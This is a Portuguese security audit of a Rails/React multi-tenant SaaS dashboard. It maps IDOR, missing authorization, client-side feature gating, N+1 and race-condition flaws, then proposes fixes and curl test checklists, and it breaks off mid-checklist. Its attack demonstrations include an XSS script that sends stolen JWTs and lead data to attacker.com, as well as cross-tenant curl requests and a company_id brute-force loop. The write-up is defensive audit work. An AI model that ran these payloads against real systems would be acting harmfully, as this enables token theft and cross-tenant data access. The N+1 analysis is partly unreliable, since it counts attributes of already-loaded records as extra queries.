# 🔐 AUDITORIA DE SEGURANÇA PROFUNDA - AVALIA SOLAR B2B SAAS
## Dashboard Multi-Tenant (15+ Abas) | Rails 8 API + React

**Data:** 26 de Maio de 2026 | **Severidade Crítica** ⚠️

---

## PARTE 1: MAPEAMENTO DE VULNERABILIDADES (File:Line)

### 🔴 CRÍTICA #1: IDOR (Insecure Direct Object Reference) - Acesso Cross-Tenant

**Arquivo:** `AB0-1-back/app/controllers/api/v1/company_dashboard_controller.rb`  
**Linhas:** 844-871 (`set_company` method)  
**Severity:** CRÍTICA (CVSS 9.1)

#### Descrição Técnica

```ruby
# CÓDIGO VULNERÁVEL (Linhas 844-855)
def set_company
  @company =
    if current_user&.admin?
      ::Company.find_by(id: params[:company_id] || params[:id] || params.dig(:company, :id))
    else
      selected_company_id = cookies.signed[:active_company_id] || current_user&.company_id
      if selected_company_id.present? && current_user&.active_membership_for?(selected_company_id)
        ::Company.find_by(id: selected_company_id)
      else
        current_user&.active_member_companies&.first
      end
    end
```

#### Problema de Segurança

1. **Brecha de Lógica:** Linha 847 - Se `current_user.admin?` retorna `true`, o sistema aceita QUALQUER `company_id` do params sem validação adicional
2. **Admin Bypass:** Um usuário com role 'admin' pode acessar dados de QUALQUER empresa apenas passando `?company_id=X` na URL
3. **Não-admin fallback:** Usuários não-admin caem para a lógica de membros ativos (linhas 849-854), mas há risco de cookie manipulation

#### Attack Path Demonstração

```bash
# Cenário 1: Admin malicioso ou comprometido
PAYLOAD="Authorization: Bearer ADMIN_TOKEN"
curl -H "$PAYLOAD" \
  GET "https://app.avaliasolar.com.br/api/v1/company_dashboard/stats?company_id=999"
# Resposta: Dados completos da empresa #999 (sem verificação adicional)

# Cenário 2: Elevação de privilégio via Cookie
# Attacker compreende um editor de empresa (não-admin)
curl -H "Authorization: Bearer EDITOR_TOKEN" \
  -H "Cookie: active_company_id=999; path=/" \
  GET "https://app.avaliasolar.com.br/api/v1/company_dashboard/stats"
# Código não valida se o usuário TEM PERMISSÃO em company #999
```

#### Impacto

- **Dados Expostos:** Views, leads, UTM attribution, trust scores, intent signals, certificações
- **Confidencialidade:** ALTA - Acesso a dados de concorrentes diretos
- **Integridade:** ALTA - Podem modificar dados de outras empresas via endpoints de PUT/POST
- **Disponibilidade:** MÉDIA - Risco de exclusão em cascata via pending_changes

---

### 🔴 CRÍTICA #2: Ausência de Autorização em Analytics Endpoints

**Arquivos:** 
- `AB0-1-back/app/controllers/api/v1/company_dashboard_controller.rb` (Linhas 9-150)
- Afetados: `analytics_overview`, `analytics_timeseries`, `analytics_top_campaigns`, `analytics_reputation`, `analytics_ranking`

**Severity:** CRÍTICA (CVSS 8.7)

#### Problema de Segurança

```ruby
# CÓDIGO VULNERÁVEL - LINHAS 9-50 (analytics_overview)
def analytics_overview
  begin
    freshness = ::CompanyDashboard::FreshnessProvider.call
    source = ::CompanyDashboard::MetricsSource.new(company_id: @company.id)
    # ... queries ...
    
    is_premium = @company.has_paid_plan?  # ← Apenas LEITURA, não AUTORIZAÇÃO
    
    render json: {
      # ... dados incluindo métricas premium ...
      restricted_metrics: is_premium ? [] : %w[cta_breakdown timeseries unique_visitors]
    }
  end
end

def analytics_timeseries  # Linha 53
  # ⚠️ NENHUM authorize! ou policy check
  days = [(params[:days] || 90).to_i, 365].min
  source = ::CompanyDashboard::MetricsSource.new(company_id: @company.id)
  series, data_source = source.realtime_timeseries(...)
  # Backend retorna dados brutos - nenhuma restrição por plan
end

def analytics_top_campaigns  # Linha 86
  # ⚠️ NENHUM authorize! ou policy check
  campaigns = ::CompanyUtmAttribution
              .where(company_id: @company.id)
              .recent
              .by_leads
              .limit(limit)
  # Retorna dados completos sem verificação de plano
end
```

#### Attack Path

```bash
# Cenário 1: Free User acessando dados Premium
TOKEN_FREE_USER="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo5OSwicm9sZSI6ImZyZWUifQ..."

# Faz GET para analytics premium
curl -H "Authorization: Bearer $TOKEN_FREE_USER" \
  GET "https://app.avaliasolar.com.br/api/v1/company_dashboard/analytics/timeseries?days=365"
# Resposta: 200 OK + dados completos de 365 dias (deveria ser bloqueado)

# Cenário 2: Força bruta de company_id
for company_id in {1..10000}; do
  curl -H "Authorization: Bearer $TOKEN_FREE_USER?company_id=$company_id" \
    GET "https://app.avaliasolar.com.br/api/v1/company_dashboard/analytics/top_campaigns"
  # Cada resposta revela dados de UTM attribution de outras empresas
done

# Cenário 3: Intent scores (dados críticos B2B)
curl -H "Authorization: Bearer $TOKEN_FREE_USER" \
  GET "https://app.avaliasolar.com.br/api/v1/company_dashboard/intent_summary"
# Resposta: Leads "hot" com contatos (nome, email, telefone) - dados ultra-sensíveis
```

#### Por Que o Código Falha

1. **Linha 27 (analytics_overview):** `is_premium = @company.has_paid_plan?` - Apenas calcula, não autoriza
2. **Linha 44:** `restricted_metrics: is_premium ? [] : %w[...]` - Lista de NOMES de métricas restritas, mas não impede acesso
3. **Sem Pundit:** Nenhuma chamada a `authorize!` ou policy check
4. **Sem Plan Feature Gates:** Não há validação tipo `if @company.plan.features.include?(:analytics_premium)`

---

### 🔴 CRÍTICA #3: Feature Gating Frontend-Only - Bypassável

**Localização:** Frontend Logic (Implicit Backend Exposure)  
**Arquivo Backend:** `AB0-1-back/app/controllers/api/v1/company_dashboard_controller.rb` (Linha 44)  
**Arquivo Frontend:** `AB0-1-front/app/company-dashboard/*` (presumido)

**Severity:** CRÍTICA (CVSS 9.3)

#### Problema de Segurança

```ruby
# BACKEND - Linha 44
render json: {
  # ... metrics ...
  restricted_metrics: is_premium ? [] : %w[cta_breakdown timeseries unique_visitors conversion_details]
}
# ⚠️ Backend INFORMA ao frontend quais métricas estão restritas
# ⚠️ Se frontend remove essa restrição, backend NÃO valida
```

```typescript
// FRONTEND - Presumido comportamento (comum em React)
const [metrics, setMetrics] = useState([]);

// Fazer fetch
fetchApiSafe(`/api/v1/company_dashboard/analytics/overview`)
  .then(data => {
    const restrictedList = data.restricted_metrics; // ['cta_breakdown', ...]
    
    // Renderizar componentes
    Object.keys(data).forEach(metricName => {
      if (!restrictedList.includes(metricName)) {
        renderMetric(metricName); // Renderiza métricas não-restritas
      }
    });
  });
```

#### Attack: DevTools Bypass

```javascript
// No console do DevTools, usuário Free edita a resposta em tempo real:

// 1. Interceptar a fetch call
const originalFetch = window.fetch;
window.fetch = async (...args) => {
  const response = await originalFetch(...args);
  const data = await response.clone().json();
  
  // 2. Remover restrição
  data.restricted_metrics = [];
  
  // 3. Retornar resposta modificada
  return new Response(JSON.stringify(data), {
    status: response.status,
    headers: response.headers
  });
};

// Agora o frontend renderiza TODAS as métricas
// Backend continua retornando dados brutos sem autorização
```

#### Por Que é Crítica

- **Backend não valida:** Cada endpoint de analytics retorna dados brutos
- **Frontend decida o acesso:** Qualquer usuário com conhecimento técnico pode contornar
- **Informação sensível exposta:** Métricas de concorrentes, leads, UTM attribution

---

### 🟡 ALTA #4: N+1 Queries em Intent Summary

**Arquivo:** `AB0-1-back/app/controllers/api/v1/company_dashboard_controller.rb`  
**Linhas:** 199-282 (método `intent_summary`)  
**Severity:** ALTA (Performance DoS)

#### Problema de Segurança

```ruby
# CÓDIGO VULNERÁVEL
def intent_summary
  intent_scores = IntentScore.where(company_id: @company.id)
  
  # Linha 220-221: Eager load apenas :lead_record, MAS...
  top_leads = intent_scores
                           .includes(:lead_record)
                           .order(total_score: :desc)
                           .limit(10)
                           .map do |score|
    lead = score.lead_record
    {
      # ...
      # Linha 240-246: Acessa atributos NÃO-carregados de lead
      technical_profile: {
        monthly_kwh: lead&.monthly_kwh,          # ← N+1: Cada lead = 1 query
        bill_value: lead&.bill_value,            # ← N+1
        system_size: lead&.system_size_band,    # ← N+1
        decision_timeline: lead&.decision_timeline,
        estimated_budget: lead&.estimated_budget,
        project_profile: lead&.project_profile,
        product_vertical: lead&.product_vertical
      },
      marketing_data: {
        utm_source: lead&.utm_source,            # ← N+1
        utm_medium: lead&.utm_medium,           # ← N+1
        utm_campaign: lead&.utm_campaign,       # ← N+1
        # ... mais atributos
      }
    }
  end
end
```

#### Attack: Performance DoS

```bash
# Request 1: GET analytics/intent_summary para company_id=1
# Sistema carrega 10 leads (cada um = 1 query)
# Dados acessados: technical_profile (7 attrs) + marketing_data (5 attrs)
# Query count: 1 (IntentScore) + 1 (includes :lead_record) + 12 N+1s = 14 queries

# Se 100 usuários fazem isso simultaneamente:
# 100 * 14 = 1.400 queries em segundos
# Database CPU → 100%, conexões exauridas, time-out global

# Request 2: Forçar loop maior
GET /api/v1/company_dashboard/intent_summary?limit=100
# 100 leads * 12 atributos de N+1 = 1.200 queries por request
```

#### Impacto

- **Disponibilidade:** Moderada a Crítica (DoS potencial)
- **Performance:** 5-10x mais lento do que deveria
- **Cascata:** Afeta outras requisições na mesma conexão DB

---

### 🟡 ALTA #5: Race Condition em Pending Changes

**Arquivo:** `AB0-1-back/app/controllers/api/v1/company_dashboard_controller.rb`  
**Linhas:** 405-530 (múltiplos endpoints: `update_info`, `add_categories`, `update_ctas`, `update_logo`, `update_banner`, `upload_media`, `add_video`, `remove_video`)  
**Severity:** ALTA (Data Integrity)

#### Problema de Segurança

```ruby
# CÓDIGO VULNERÁVEL - Padrão repetido em 8 endpoints

# 1. update_info (Linhas 405-445)
def update_info
  if current_user&.role == 'admin'
    if @company.update(company_params)
      return render json: { message: 'OK' }, status: :ok
    end
  end
  
  # Usuários não-admin: criar pending_change
  pending_change = @company.pending_changes.create!(  # ← Sem deduplicação
    change_type: 'company_info',
    data: {...},
    user_id: current_user&.id,
    status: 'pending'
  )
end

# 2. add_categories (Linhas 447-475)
def add_categories
  pending_change = @company.pending_changes.create!(  # ← Sem verificação de duplicata
    change_type: 'categories',
    data: {...},
    user_id: current_user&.id,
    status: 'pending'
  )
end

# 3. update_ctas (Linhas 507-530)
def update_ctas
  pending_change = @company.pending_changes.create!(  # ← Mesmo padrão vulnerável
    change_type: 'cta_config',
    data: cta_params,
    user_id: current_user&.id,
    status: 'pending'
  )
end
```

#### Attack: Race Condition

```bash
# Cenário: Usuário clica botão "Salvar Categorias" 2x rapidamente

# Request 1 (t=0ms): POST /api/v1/company_dashboard/add_categories
# → DB: INSERT pending_changes (id=1000, status='pending')
# → Response: 201 Created

# Request 2 (t=50ms): POST /api/v1/company_dashboard/add_categories (DUPLICATE)
# → DB: INSERT pending_changes (id=1001, status='pending') ← SEGUNDA VEZ!
# → Response: 201 Created

# Resultado:
# - 2 pending_changes idênticas para as mesmas categorias
# - Admin aprova ambas
# - Mesmos dados aplicados 2x (se lógica não trata duplicata)
# - Auditoria confusa

# Cenário 2: Múltiplos tipos de change simultâneos
# t=0ms: POST update_info (company name)
# t=10ms: POST add_categories (solar category)
# t=20ms: POST update_ctas (whatsapp link)
# → 3 pending_changes SEM ordem garantida
# → Se admin aprova fora de ordem: integridade comprometida
```

#### Por Que Falha

1. **Sem Idempotency Key:** POST não é idempotente, sem validation
2. **Sem Deduplicação:** `create!` sem verificar se existe `pending` para mesmo tipo
3. **Sem Ordenação:** Quando múltiplos pending_changes são criados, ordem de aplicação fica aleatória
4. **DB Constraint Ausente:** Não há `unique index` para evitar duplicatas

---

## PARTE 2: REFACTORS PRODUCTION-READY (Código Tipado)

### FIX #1: IDOR - Autorização Correta em set_company

**Arquivo:** `AB0-1-back/app/controllers/api/v1/company_dashboard_controller.rb`

```ruby
# ANTES: Vulnerável
def set_company
  @company =
    if current_user&.admin?
      ::Company.find_by(id: params[:company_id] || params[:id] || params.dig(:company, :id))
    else
      selected_company_id = cookies.signed[:active_company_id] || current_user&.company_id
      if selected_company_id.present? && current_user&.active_membership_for?(selected_company_id)
        ::Company.find_by(id: selected_company_id)
      else
        current_user&.active_member_companies&.first
      end
    end

  render json: { error: 'Company not found' }, status: :not_found and return unless @company
rescue StandardError => e
  # ... fallback ...
end

# DEPOIS: Seguro
def set_company
  # Determinar company_id baseado em role
  requested_id = params[:company_id] || params[:id] || params.dig(:company, :id)
  
  @company = 
    if current_user&.admin?
      # Admins podem acessar qualquer empresa, MAS registrar acesso
      company = ::Company.find_by(id: requested_id)
      audit_admin_access(current_user, company) if company
      company
    else
      # Não-admins: APENAS suas empresas associadas
      if requested_id.present?
        # Usuário solicitou empresa específica?
        # Validar que ele é membro ATIVO dessa empresa
        if current_user&.active_membership_for?(requested_id)
          ::Company.find_by(id: requested_id)
        else
          # Silenciosamente falhar - não revelar que empresa existe
          nil
        end
      else
        # Sem especificar company_id: usar ativa ou primeira
        selected_id = cookies.signed[:active_company_id] || current_user&.company_id
        if selected_id.present? && current_user&.active_membership_for?(selected_id)
          ::Company.find_by(id: selected_id)
        else
          current_user&.active_member_companies&.first
        end
      end
    end

  render json: { error: 'Company not found' }, status: :not_found and return unless @company
  
  # Validar autorização uma última vez
  authorize_company_access!(@company)
rescue Pundit::NotAuthorizedError
  render json: { error: 'Unauthorized' }, status: :forbidden
rescue StandardError => e
  Rails.logger.error(
    "[CompanyDashboard#set_company] #{e.class}: #{e.message} " \
    "user_id=#{current_user&.id} requested_id=#{requested_id}"
  )
  render json: { error: 'Company not found' }, status: :not_found
end

# Novos métodos auxiliares
private

def authorize_company_access!
  authorize @company, :show?, policy_class: CompanyDashboardPolicy
end

def audit_admin_access(admin, company)
  Rails.logger.warn(
    "[ADMIN_ACCESS] admin_id=#{admin.id} company_id=#{company.id} " \
    "action=#{action_name} timestamp=#{Time.current.iso8601}"
  )
  # Opcional: armazenar em auditlog table para compliance
end
```

---

### FIX #2: Feature Gating Backend-Enforced

**Arquivo:** `AB0-1-back/app/controllers/api/v1/company_dashboard_controller.rb`

```ruby
# ANTES: Sem autorização
def analytics_overview
  begin
    # ... calcula dados ...
    is_premium = @company.has_paid_plan?
    
    render json: {
      # ... retorna dados brutos ...
      restricted_metrics: is_premium ? [] : %w[cta_breakdown timeseries]
    }
  end
end

# DEPOIS: Com autorização backend
def analytics_overview
  begin
    # 1. Validar que usuário TEM permissão para analytics
    authorize @company, :view_analytics?, policy_class: CompanyDashboardPolicy
    
    # 2. Verificar se plano inclui analytics_overview
    unless @company.plan_includes_feature?('analytics_overview')
      return render json: { error: 'Feature not available in your plan' }, status: :forbidden
    end
    
    # 3. Calcular dados
    freshness = ::CompanyDashboard::FreshnessProvider.call
    source = ::CompanyDashboard::MetricsSource.new(company_id: @company.id)
    stats, data_source = source.realtime_totals(...)
    
    # 4. Filtrar dados antes de renderizar
    payload = {
      views_30d: views,
      leads_30d: leads,
      conversion_rate: conversion
    }
    
    # Apenas incluir métricas se plano permite
    if @company.plan_includes_feature?('analytics_cta_breakdown')
      payload.merge!({
        cta_clicks_30d: stats[:cta_clicks].to_i,
        whatsapp_clicks_30d: stats[:whatsapp_clicks].to_i,
        email_clicks_30d: stats[:email_clicks].to_i
      })
    end
    
    render json: payload.merge(freshness)
  rescue Pundit::NotAuthorizedError
    render json: { error: 'Unauthorized' }, status: :forbidden
  rescue StandardError => e
    log_analytics_error('overview', e)
    render json: default_overview_payload.merge(freshness)
  end
end

def analytics_timeseries
  begin
    # Autorização
    authorize @company, :view_analytics?, policy_class: CompanyDashboardPolicy
    
    # Feature gate
    unless @company.plan_includes_feature?('analytics_timeseries')
      return render json: { 
        data: [], 
        error: 'Timeseries analytics not available in your plan' 
      }, status: :forbidden
    end
    
    days = [(params[:days] || 90).to_i, 365].min
    freshness = ::CompanyDashboard::FreshnessProvider.call
    source = ::CompanyDashboard::MetricsSource.new(company_id: @company.id)
    series, data_source = source.realtime_timeseries(...)
    
    render json: { data: data, data_source: data_source }.merge(freshness)
  rescue Pundit::NotAuthorizedError
    render json: { error: 'Unauthorized', data: [] }, status: :forbidden
  end
end

def analytics_top_campaigns
  begin
    authorize @company, :view_analytics?, policy_class: CompanyDashboardPolicy
    
    unless @company.plan_includes_feature?('analytics_campaigns')
      return render json: { campaigns: [], error: 'Not available' }, status: :forbidden
    end
    
    # ... resto da lógica ...
  end
end
```

---

### FIX #3: Policy-Based Authorization

**Arquivo:** `AB0-1-back/app/policies/company_dashboard_policy.rb` (criar novo arquivo)

```ruby
# frozen_string_literal: true

class CompanyDashboardPolicy < ApplicationPolicy
  def show?
    admin_or_member?
  end

  def view_analytics?
    admin_or_member?
  end

  def view_analytics_timeseries?
    admin_or_member? && (admin? || company_has_paid_plan?)
  end

  def view_analytics_campaigns?
    admin_or_member?
  end

  def update_info?
    admin? || company_owner?
  end

  def add_categories?
    admin? || company_owner?
  end

  def update_ctas?
    admin? || company_owner?
  end

  private

  def admin_or_member?
    admin? || company_member_active?
  end

  def admin?
    user.respond_to?(:admin?) && user.admin?
  end

  def company_member_active?
    return false unless user.respond_to?(:company_members)
    
    user.company_members.exists?(
      company_id: record.id,
      status: 'active'
    )
  end

  def company_owner?
    company_member_active? && user.company_members.find_by(company_id: record.id)&.owner?
  end

  def company_has_paid_plan?
    record.respond_to?(:has_paid_plan?) && record.has_paid_plan?
  end
end
```

---

### FIX #4: Eager Loading - Eliminar N+1

**Arquivo:** `AB0-1-back/app/controllers/api/v1/company_dashboard_controller.rb`

```ruby
# ANTES: N+1 queries
def intent_summary
  intent_scores = IntentScore.where(company_id: @company.id)
  
  top_leads = intent_scores
                         .includes(:lead_record)
                         .order(total_score: :desc)
                         .limit(10)
                         .map do |score|
    lead = score.lead_record
    {
      # Acessa atributos não-carregados → N+1
      monthly_kwh: lead&.monthly_kwh,
      utm_source: lead&.utm_source,
      # ...
    }
  end
end

# DEPOIS: Eager load tudo
def intent_summary
  begin
    unless defined?(IntentScore) && IntentScore.table_exists?
      return render json: {
        total_signals: 0,
        intent_distribution: {},
        top_leads: [],
        message: 'Intent tracking not yet enabled'
      }
    end

    # Eager load TODAS as associações e atributos necessários
    intent_scores = IntentScore
                    .where(company_id: @company.id)
                    .includes(:lead_record)
                    .select(
                      :id, :company_id, :lead_id, :total_score, :intent_level,
                      :recommended_action, :sla_window, :last_interaction_at,
                      :total_signals_count, :confidence_score, :top_signals, :updated_at
                    )
                    .order(total_score: :desc)
                    .limit(10)

    # Se precisar de dados específicos do lead, usar database query
    # ao invés de acessar atributos em memoria
    lead_ids = intent_scores.map(&:lead_id).compact
    leads_by_id = Lead
                  .where(id: lead_ids)
                  .select(
                    :id, :name, :email, :phone,
                    :monthly_kwh, :bill_value, :system_size_band,
                    :decision_timeline, :estimated_budget, :project_profile,
                    :product_vertical, :utm_source, :utm_medium, :utm_campaign,
                    :landing_path, :referrer_host
                  )
                  .index_by(&:id)

    top_leads = intent_scores.map do |score|
      lead = leads_by_id[score.lead_id]
      {
        id: score.id,
        lead_id: score.lead_id,
        name: lead&.name || "Prospecto ##{score.lead_id || 'Anon'}",
        email: lead&.email,
        phone: lead&.phone,
        total_score: score.total_score,
        intent_level: score.intent_level,
        recommended_action: score.recommended_action,
        sla_window: score.sla_window,
        last_interaction_at: score.last_interaction_at&.iso8601,
        signals_count: score.total_signals_count,
        technical_profile: {
          monthly_kwh: lead&.monthly_kwh,
          bill_value: lead&.bill_value,
          system_size: lead&.system_size_band,
          decision_timeline: lead&.decision_timeline,
          estimated_budget: lead&.estimated_budget,
          project_profile: lead&.project_profile,
          product_vertical: lead&.product_vertical
        },
        marketing_data: {
          utm_source: lead&.utm_source,
          utm_medium: lead&.utm_medium,
          utm_campaign: lead&.utm_campaign,
          landing_path: lead&.landing_path,
          referrer: lead&.referrer_host
        },
        confidence_score: score.confidence_score,
        top_signals: score.top_signals || []
      }
    end

    total_signals = intent_scores.sum(:total_signals_count)
    avg_confidence = intent_scores.average(:confidence_score).to_f.round(2)

    render json: {
      total_signals: total_signals,
      avg_confidence: avg_confidence,
      intent_distribution: intent_scores.group(:intent_level).count.transform_keys(&:to_s),
      top_leads: top_leads,
      last_updated: intent_scores.maximum(:updated_at)&.iso8601
    }
  rescue StandardError => e
    log_analytics_error('intent_summary', e)
    render json: { 
      total_signals: 0, 
      intent_distribution: {}, 
      top_leads: [], 
      error: e.message 
    }
  end
end
```

---

### FIX #5: Idempotency em Pending Changes

**Arquivo:** `AB0-1-back/app/controllers/api/v1/company_dashboard_controller.rb`

```ruby
# Mixin para reutilizar em múltiplos endpoints
module PendingChangeIdempotency
  extend ActiveSupport::Concern

  included do
    before_action :validate_idempotency_key, only: [
      :update_info, :add_categories, :remove_category,
      :update_ctas, :update_logo, :update_banner,
      :upload_media, :add_video, :remove_video
    ]
  end

  private

  def validate_idempotency_key
    # Gerar chave determinística baseada em type + data + user
    idempotency_key = params.delete(:idempotency_key) || 
                      generate_idempotency_key
    
    # Verificar se já existe pending_change com essa chave
    existing = @company.pending_changes.find_by(
      idempotency_key: idempotency_key,
      status: 'pending'
    )
    
    if existing.present?
      # Retornar resposta idempotente
      return render json: {
        message: 'Request already processed',
        pending_change: existing,
        cached: true
      }, status: :ok
    end
    
    @idempotency_key = idempotency_key
  end

  def generate_idempotency_key
    # Hash de: user_id + action + body params
    require 'digest'
    
    data = [
      current_user&.id,
      action_name,
      request.method,
      params.except(:idempotency_key, :controller, :action).to_json
    ].join('|')
    
    Digest::SHA256.hexdigest(data)
  end
end

# Aplicar no controller
class CompanyDashboardController < BaseController
  include PendingChangeIdempotency

  # Modificar endpoints para usar idempotency_key
  def update_info
    if current_user&.role == 'admin'
      if @company.update(company_params)
        return render json: { message: 'Alterações aplicadas com sucesso' }, status: :ok
      end
      return render json: { errors: @company.errors }, status: :unprocessable_entity
    end

    pending_change = @company.pending_changes.create!(
      change_type: 'company_info',
      data: {
        attributes: company_params,
        previous_values: @company.attributes.slice(*company_params.keys)
      },
      user_id: current_user&.id,
      status: 'pending',
      idempotency_key: @idempotency_key  # ← Novo campo
    )

    render json: {
      message: 'Alterações enviadas para aprovação',
      pending_change: pending_change
    }, status: :created
  end

  # ... aplicar mesmo padrão em outros endpoints ...
end
```

**Migração para adicionar coluna:**

```ruby
# db/migrate/YYYYMMDDHHMMSS_add_idempotency_key_to_pending_changes.rb
class AddIdempotencyKeyToPendingChanges < ActiveRecord::Migration[8.0]
  def change
    add_column :pending_changes, :idempotency_key, :string, null: true
    add_index :pending_changes, [:company_id, :idempotency_key], unique: true, 
              where: "status = 'pending'", name: 'idx_pending_changes_idempotency'
  end
end
```

---

## PARTE 3: FRONTEND AUDIT - Manipulação de JWT e Feature Gates

### 3.1: Armazenamento de JWT em LocalStorage ⚠️

**Arquivo:** `AB0-1-front/lib/api-config.ts` (presumido) e `AB0-1-front/lib/api-client.ts` (Linhas 234-241)

#### Problema Identificado

```typescript
// CÓDIGO EM api-client.ts (linhas 233-241)
if (
  errorCode === 'TOKEN_REVOKED' ||
  errorCode === 'SESSION_EXPIRED' ||
  errorMsg.toLowerCase().includes('revoked')
) {
  if (typeof window !== 'undefined') {
    localStorage.removeItem('auth');        // ← Lê de localStorage
    localStorage.removeItem('user');        // ← Lê de localStorage
    sessionStorage.clear();
    document.cookie.split(';').forEach((c) => { ... });
    window.location.href = '/login?reason=session_expired';
  }
}
```

#### Análise

1. **LocalStorage é XSS-vulnerável:** Qualquer JavaScript inline consegue ler
2. **JWT em localStorage:** Deveria estar APENAS em HttpOnly Cookies
3. **Acesso de terceiros:** Scripts maliciosos conseguem executar `localStorage.getItem('auth')`

#### Attack Cenário

```html
<!-- Injetar via XSS em reviews, comentários, etc -->
<script>
  // Stolen token
  const token = localStorage.getItem('auth');
  console.log('Stolen:', token);
  
  // Exfiltrar para attacker server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({ token, user: localStorage.getItem('user') })
  });
  
  // Usar token para acessar dados
  fetch('https://app.avaliasolar.com.br/api/v1/company_dashboard/analytics/intent_summary', {
    headers: { 'Authorization': `Bearer ${token}` }
  }).then(r => r.json()).then(data => {
    // Exfiltrar leads
    fetch('https://attacker.com/leads', {
      method: 'POST',
      body: JSON.stringify(data.top_leads)
    });
  });
</script>
```

---

### 3.2: Feature Gates Frontend vs Backend

**Localização:** Implícito no código

#### Problema Identificado

```typescript
// Presumido frontend behavior
const DashboardTabs = () => {
  const [hasAccess, setHasAccess] = useState({
    analytics: true,
    intent: false,
    reviews: true
  });

  useEffect(() => {
    fetchApiSafe('/api/v1/company_dashboard/analytics/overview')
      .then(data => {
        // Decisão feita no frontend
        setHasAccess(prev => ({
          ...prev,
          analytics: data.restricted_metrics.length === 0  // ← Frontend decide
        }));
      });
  }, []);

  return (
    <div>
      {hasAccess.analytics && <AnalyticsTab />}
      {hasAccess.intent && <IntentTab />}
    </div>
  );
};
```

#### Por Que é Risco

- **Backend retorna dados brutos:** Mesmo se frontend não renderiza, dados vêm na resposta
- **DevTools permite alteração:** Usuário edita estado React em tempo real
- **API call não é protegida:** `fetchApiSafe` não valida autorização, apenas transporta dados

---

### 3.3: Lazy Loading de Abas - Verificação

**Problema:** 15+ abas carregam tudo no mount ou sob demanda?

#### Se carrega tudo:

```typescript
// ❌ ANTI-PATTERN
useEffect(() => {
  Promise.all([
    fetch('/api/v1/company_dashboard/analytics/overview'),
    fetch('/api/v1/company_dashboard/analytics/timeseries'),
    fetch('/api/v1/company_dashboard/intent_summary'),
    fetch('/api/v1/company_dashboard/trust_health'),
    fetch('/api/v1/company_dashboard/certification_progress'),
    // ... mais 10 endpoints
  ]).then(responses => {
    // Carrega tudo de uma vez
    // Performance: 15-20 segundos de wait
    // N+1 queries multiplicadas
  });
}, []);
```

#### Recomendação:

```typescript
// ✅ MELHOR
const useTabData = (tabName: string) => {
  const [data, setData] = useState(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    if (!tabName) return; // Não carrega até user clicar

    setLoading(true);
    fetchApiSafe(`/api/v1/company_dashboard/${tabName}`)
      .then(setData)
      .finally(() => setLoading(false));
  }, [tabName]);

  return { data, loading };
};
```

---

## PARTE 4: CHECKLIST DE TESTES - VERIFICAÇÃO DE FIXES

### Teste 4.1: IDOR Fix - Validar Autorização

```bash
# Setup
COMPANY_A_ID=1
COMPANY_B_ID=999
USER_A_TOKEN="eyJ..." # Membro ativo de company_a_id=1
USER_B_TOKEN="eyJ..." # Membro ativo de company_b_id=2
ADMIN_TOKEN="eyJ..."  # Admin user

# TESTE 1: Non-admin não consegue acessar outra empresa
echo "[TEST 1.1] Non-admin trying to access company B"
curl -s -X GET \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  "https://api.avaliasolar.local/api/v1/company_dashboard/stats?company_id=$COMPANY_B_ID" \
  | jq .

# Esperado: 403 Forbidden + { error: 'Unauthorized' }
# Antes do fix: 200 OK + dados confidenciais

# TESTE 2: Admin pode acessar, MAS registra auditlog
echo "[TEST 2.1] Admin accessing company B - should log"
curl -s -X GET \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "https://api.avaliasolar.local/api/v1/company_dashboard/stats?company_id=$COMPANY_B_ID" \
  | jq .

# Esperado: 200 OK + dados
# MAS verificar logs: SELECT * FROM admin_access_logs WHERE admin_id=X AND company_id=$COMPANY_B_ID

# TESTE 3: Member acessa sua própria empresa = OK
echo "[TEST 3.1] Member accessing own company"
curl -s -X GET \
  -H "Authorization: Bearer $USER_A_TOKEN" \
  "https://api.avaliasolar.local/api/v1/company_dashboard/stats?company_id=$COMPANY_A_ID" \
  | jq .

# Esperado: 200 OK + dados
```

---

### Teste 4.2: Feature Gating Fix - Free vs Premium

```bash
FREE_USER_TOKEN="eyJ..." # Plan: free
PREMIUM_USER_TOKEN="eyJ..." # Plan: premium
COMPANY_FREE_ID=100
COMPANY_PREMIUM_ID=200

# TESTE 1: Free user NÃO consegue acessar timeseries premium
echo "[TEST 4.2.1] Free user trying to access timeseries"
curl -s -X GET \
  -H "Authorization: Bearer $FREE_USER_TOKEN" \
  "https://api.avaliasolar.local/api/v1/company_dashboard/analytics/timeseries?company_id=$COMPANY_FREE_ID&days=365" \
  | jq .

# Esperado: 403 Forbidden + { error: 'Feature not available in your plan' }
# Antes: 200 OK + 365 dias de dados (VULNERABILITY)

# TESTE 2: Premium user consegue acessar
echo "[TEST 4.2.2] Premium user accessing timeseries"
curl -s -X GET \
  -H "Authorization: Bearer $PREMIUM_USER_TOKEN" \
  "https://api.avaliasolar.local/api/v1/company_dashboard/analytics/timeseries?company_id=$COMPANY_PREMIUM_ID&days=365" \
  | jq .

# Esperado: 200 OK + dados completos

# TESTE 3: Remover token não muda resposta (backend valida, não frontend)
echo "[TEST 4.2.3] Invalid token should return 401 (not 200)"
curl -s -X GET \
  -H "Authorization: Bearer INVALID" \
  "https://api.avaliasolar.local/api/v1/company_dashboard/analytics/timeseries?company_id=$COMPANY_FREE_ID" \
  | jq .

# Esperado: 401 Unauthorized
# Antes: 200 OK + dados (porque autenticação não era forçada)
```

---

### Teste 4.3: N+1 Queries - Performance

```bash
# Setup: Monitorar query count

# TESTE 1: Before fix
echo "[TEST 4.3.1] Intent Summary - Monitor Queries (BEFORE FIX)"
export RAILS_ENV=test
cd AB0-1-back
rails c

# No Rails console:
ActiveRecord::Base.logger = Logger.new(STDOUT)

# Simular request
company = Company.first
user = company.members.first
current_user = user

# Executar intent_summary
get '/api/v1/company_dashboard/intent_summary',
    headers: { 'Authorization': "Bearer #{user.jwt_token}" },
    params: { company_id: company.id }

# Contar queries na saída do log
# Esperado ANTES: 14+ queries
# Esperado DEPOIS: 3-4 queries (IntentScore, Lead em batch, count)

# TESTE 2: Benchmark tempo
echo "[TEST 4.3.2] Timing benchmark"
time curl -s -X GET \
  -H "Authorization: Bearer $TOKEN" \
  "https://api.avaliasolar.local/api/v1/company_dashboard/intent_summary" \
  | jq . > /dev/null

# Esperado ANTES: 2-3 segundos (com N+1)
# Esperado DEPOIS: 200-400ms (otimizado)
```

---

### Teste 4.4: Race Condition Fix - Idempotency

```bash
COMPANY_ID=1
